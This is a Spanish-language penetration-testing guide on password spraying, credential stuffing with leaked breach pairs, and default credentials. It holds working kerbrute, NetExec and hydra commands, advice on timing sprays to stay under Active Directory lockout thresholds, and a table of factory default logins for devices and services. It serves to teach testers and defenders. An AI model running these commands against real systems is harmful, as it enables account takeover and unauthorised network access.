# Password Spraying, Credential Stuffing y Defaults

Tres técnicas de ataque remoto con perfiles de riesgo y efectividad muy distintos. Elegir la correcta depende del contexto: entorno AD, aplicación web, dispositivo de red o servicio en la nube.

### Password Spraying

El spraying invierte la lógica del brute-force clásico: en lugar de probar muchas contraseñas contra un usuario, prueba **una sola contraseña contra muchos usuarios**. Esto evita superar el umbral de lockout por cuenta.

Es especialmente eficaz en Active Directory, donde las políticas de lockout son por usuario y las contraseñas corporativas tienden a seguir patrones predecibles (`Empresa2024!`, `Welcome1`, `Changeme123`).

#### Herramientas para AD

```bash
# Kerbrute — enumera usuarios válidos y hace spraying vía Kerberos (sin generar eventos de lockout en muchos configs)
kerbrute passwordspray -d dominio.local --dc 192.168.1.10 users.txt 'Password2024!'

# NetExec (antiguo CrackMapExec)
netexec smb 192.168.1.10 -u users.txt -p 'Password2024!' --continue-on-success

# Spray con múltiples contraseñas (una por ronda, con delay entre rondas)
netexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce
```

#### Timing — respetar la ventana de lockout

Si la política de AD es "bloquear tras 5 intentos en 30 minutos", la estrategia es:

* Una contraseña por ronda
* Esperar **al menos el tiempo de observación** (30 min en el ejemplo) entre rondas
* Nunca superar `umbral - 1` intentos por cuenta

```bash
# Con delay manual entre rondas
netexec smb target -u users.txt -p 'Password2024!' --continue-on-success
sleep 1800
netexec smb target -u users.txt -p 'Welcome1!' --continue-on-success
```

> Antes de hacer spraying en AD, enumerar la política de lockout con `netexec smb target -u user -p pass --pass-pol` o PowerView `Get-DomainPolicy`.

### Credential Stuffing

El stuffing usa pares `usuario:contraseña` reales extraídos de brechas públicas (HaveIBeenPwned, dehashed, etc.) y los prueba contra otros servicios, aprovechando la reutilización de credenciales. No es fuerza bruta — son credenciales válidas probadas en un contexto diferente.

```bash
hydra -C leaked_credentials.txt https-post-form://app.empresa.com/login \
  "/login:user=^USER^&pass=^PASS^:Invalid"
```

Herramientas más especializadas: `Snipr`, `Storm`, `Sentry MBA` (uso forense/investigativo), o scripts personalizados con `requests` en Python.

> El stuffing es altamente efectivo en servicios de consumo pero también en VPNs, portales de empleados y Citrix cuando se usan credenciales corporativas en servicios externos comprometidos.

### Credenciales por defecto

Dispositivos de red, impresoras, cámaras IP, paneles de administración y appliances suelen salir de fábrica con credenciales conocidas que nunca se cambian.

Recursos de referencia:

* `https://www.default-password.info`
* `https://cirt.net/passwords`
* SecLists: `SecLists/Passwords/Default-Credentials/`

```bash
# Ejemplo: atacar router con credenciales por defecto
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  192.168.1.1 http-get /

# NetExec con lista de defaults para SMB
netexec smb 192.168.1.0/24 -u admin -p admin
netexec smb 192.168.1.0/24 -u administrator -p ''   # cuenta sin contraseña
```

#### Defaults habituales

| Dispositivo/Servicio | Usuario         | Contraseña           |
| -------------------- | --------------- | -------------------- |
| Cisco IOS            | `cisco`         | `cisco`              |
| HP iLO / iDRAC       | `Administrator` | (en etiqueta física) |
| IPMI                 | `ADMIN`         | `ADMIN`              |
| MySQL                | `root`          | `""` (vacía)         |
| PostgreSQL           | `postgres`      | `postgres`           |
| Tomcat               | `tomcat`        | `tomcat` / `s3cret`  |
| Jenkins              | `admin`         | `admin`              |
| Printer admin panels | `admin`         | `admin` / `1234`     |

> En reconocimiento de red interna, hacer un sweep con NetExec probando `admin:admin` y `administrator:` (vacía) contra todos los hosts con SMB abierto puede dar accesos inmediatos sin necesidad de cracking.
